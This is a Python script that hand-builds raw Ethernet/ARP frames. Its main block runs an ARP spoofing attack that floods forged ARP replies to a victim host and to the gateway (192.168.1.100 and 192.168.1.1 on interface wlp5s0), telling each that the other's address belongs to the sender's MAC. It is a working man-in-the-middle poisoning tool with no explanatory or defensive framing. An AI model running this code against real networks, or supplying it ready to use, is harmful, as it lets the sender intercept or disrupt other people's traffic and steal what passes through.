import time
import socket
import os
import signal
import sys
from struct import pack


class ARP(object):
    bcast_mac = pack('!6B', *(0xFF,) * 6)
    ARPOP_REQUEST = pack('!H', 0x0001)
    ARPOP_REPLY = pack('!H', 0x0002)
    ETHERNET_PROTOCOL_TYPE_ARP = pack('!H', 0x0806)
    ARP_PROTOCOL_TYPE_ETHERNET_IP = pack('!HHBB', 0x0001, 0x0800, 0x0006, 0x0004)

    def __init__(self, arptype, device,sender_ip, sender_mac, target_ip, target_mac='00:00:00:00:00:00'):
        self.arpop     =      ARP.ARPOP_REQUEST if arptype=='req' else ARP.ARPOP_REPLY # req request rep reply
        self.device      =      device
        self.sender_ip   =      pack('!4B', *[int(x) for x in sender_ip.split('.')])
        self.sender_mac  =      pack('!6B', *[int(x, 16) for x in sender_mac.split(':')])
        self.target_ip   =      pack('!4B', *[int(x) for x in target_ip.split('.')])
        self.target_mac  =      pack('!6B', *[int(x, 16) for x in target_mac.split(':')])
        self.des_mac     =      ARP.bcast_mac if arptype=='req' else self.target_mac
    def send(self):
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.SOCK_RAW)
        sock.bind((self.device, socket.SOCK_RAW))
        arpframe = [
                # ## ETHERNET
                # destination MAC addr
                self.des_mac,
                # source MAC addr
                self.sender_mac,

                ARP.ETHERNET_PROTOCOL_TYPE_ARP,

                # ## ARP
                ARP.ARP_PROTOCOL_TYPE_ETHERNET_IP,
                # operation type
                self.arpop,
                # sender MAC addr
                self.sender_mac,
                # sender IP addr
                self.sender_ip,
                # target hardware addr
                self.target_mac,
                # target IP addr
                self.target_ip
            ]
        sock.send(b''.join(arpframe))


if __name__ == "__main__":
    # arp = ARP('req','wlp5s0','192.168.1.110','34:e6:ad:5c:6b:88','192.168.1.100')
    # arp.send()
    # input()
    for _ in range(10000):
        time.sleep(1)
        arp2 = ARP('rep','wlp5s0','192.168.1.1','34:e6:ad:5c:6b:88','192.168.1.100','34:80:b3:fc:eb:1f')
        arp2.send()
        arp3 = ARP('rep','wlp5s0','192.168.1.100', '34:e6:ad:5c:6b:88','192.168.1.1','a8:57:4e:ba:df:1a')
        arp3.send()
